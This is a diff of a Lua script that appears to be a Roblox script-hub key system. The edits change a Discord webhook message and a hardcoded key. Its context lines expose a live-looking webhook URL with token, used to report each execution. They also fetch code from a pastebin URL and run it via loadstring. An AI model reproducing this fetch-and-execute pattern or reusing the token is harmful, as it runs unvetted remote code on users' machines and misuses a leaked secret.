@@ -8,7 +8,7 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1039974108194156675/gZUaiXWjUBFHodqXgjJ3HkuoYFKCaJWCOz_t-ZwkW7F02xXtrhAVnMPlwmp9sFpetZew"
 local data = {
-   ["content"] = "<@654054638143930368>",
+   ["content"] = "sex",
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed The Key System!**",
@@ -58,7 +58,7 @@ local Tab = Window:MakeTab({
     PremiumOnly = false
 }) 
  
-_G.Key = "ILikeCats!" 
+_G.Key = "cATsAReawEsOMe-meow-meow-uwu" 
 _G.KeyInput = "string"
 function MakeScriptHub()
 loadstring(game:HttpGet("https://pastebin.com/raw/fppSTsNh"))() 
